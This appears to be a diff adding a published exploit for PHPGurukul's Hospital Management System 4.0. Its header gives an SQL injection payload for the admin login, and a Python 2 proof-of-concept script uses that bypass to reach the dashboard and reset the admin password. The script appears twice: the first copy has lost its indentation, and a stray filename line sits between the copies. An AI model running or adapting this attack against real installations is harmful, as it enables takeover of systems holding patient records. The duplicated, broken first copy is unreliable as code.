@@ -1,0 +1,116 @@
+# Exploit Title: Hospital Management System 4.0 - Authentication Bypass
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/hospital-management-system-in-php/
+# Version: v4.0
+# Category: Webapps
+# Tested on: Xampp for Windows
+
+# Description:
+# Password and username parameters have sql injection vulnerability on admin panel.
+# username: joke' or '1'='1 , password: joke' or '1'='1
+# Exploit changes password of admin user.
+
+
+
+#!/usr/bin/python
+
+import requests
+import sys
+
+
+if (len(sys.argv) !=2) or sys.argv[1] == "-h":
+print "[*] Usage: PoC.py rhost/rpath"
+print "[*] e.g.: PoC.py 127.0.0.1/hospital"
+exit(0)
+
+rhost = sys.argv[1]
+
+npasswd = str(raw_input("Please enter at least six characters for new password: "))
+
+url = "http://"+rhost+"/hms/admin/index.php"
+data = {"username": "joke' or '1'='1", "password": "joke' or '1'='1", "submit": "", "submit": ""}
+
+
+#login
+
+with requests.Session() as session:
+lpost = session.post(url=url, data=data, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+
+#check authentication bypass
+
+check = session.get("http://"+rhost+"/hms/admin/dashboard.php", allow_redirects=False)
+print ("[*] Status code: %s"%check.status_code)
+
+if check.status_code == 200:
+print "[+] Authentication bypass was successful!"
+print "[+] Trying to change password."
+elif check.status_code == 404:
+print "[-] One bad day! Check target web application path."
+sys.exit()
+else:
+print "[-] One bad day! Authentication bypass was unsuccessful! Try it manually."
+sys.exit()
+
+#change password
+
+cgdata = {"cpass": "joke' or '1'='1", "npass": ""+npasswd+"", "cfpass": ""+npasswd+"","submit":""}
+cgpasswd = session.post("http://"+rhost+"/hms/admin/change-password.php", data=cgdata, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+if cgpasswd.status_code == 200:
+print ("[+] Username is: admin")
+  print ("[+] New password is: %s"%npasswd)
+        else:
+print "[-] One bad day! Try it manually."
+sys.exit()
+
+hospital_poc.py
+
+#!/usr/bin/python
+
+import requests
+import sys
+
+
+if (len(sys.argv) !=2) or sys.argv[1] == "-h":
+	print "[*] Usage: PoC.py rhost/rpath"
+	print "[*] e.g.: PoC.py 127.0.0.1/hospital"
+	exit(0) 
+
+rhost = sys.argv[1]
+
+npasswd = str(raw_input("Please enter at least six characters for new password: "))
+
+url = "http://"+rhost+"/hms/admin/index.php"
+data = {"username": "joke' or '1'='1", "password": "joke' or '1'='1", "submit": "", "submit": ""} 
+
+
+#login
+
+with requests.Session() as session:
+	lpost = session.post(url=url, data=data, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+	
+	#check authentication bypass
+
+	check = session.get("http://"+rhost+"/hms/admin/dashboard.php", allow_redirects=False)
+	print ("[*] Status code: %s"%check.status_code)
+
+	if check.status_code == 200:
+		print "[+] Authentication bypass was successful!"
+		print "[+] Trying to change password."
+	elif check.status_code == 404:
+		print "[-] One bad day! Check target web application path."
+		sys.exit()
+	else:
+		print "[-] One bad day! Authentication bypass was unsuccessful! Try it manually."
+		sys.exit()
+	
+	#change password
+
+	cgdata = {"cpass": "joke' or '1'='1", "npass": ""+npasswd+"", "cfpass": ""+npasswd+"","submit":""}
+	cgpasswd = session.post("http://"+rhost+"/hms/admin/change-password.php", data=cgdata, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+	if cgpasswd.status_code == 200:
+		print ("[+] Username is: admin")
+  		print ("[+] New password is: %s"%npasswd)
+        else:
+		print "[-] One bad day! Try it manually."
+		sys.exit()
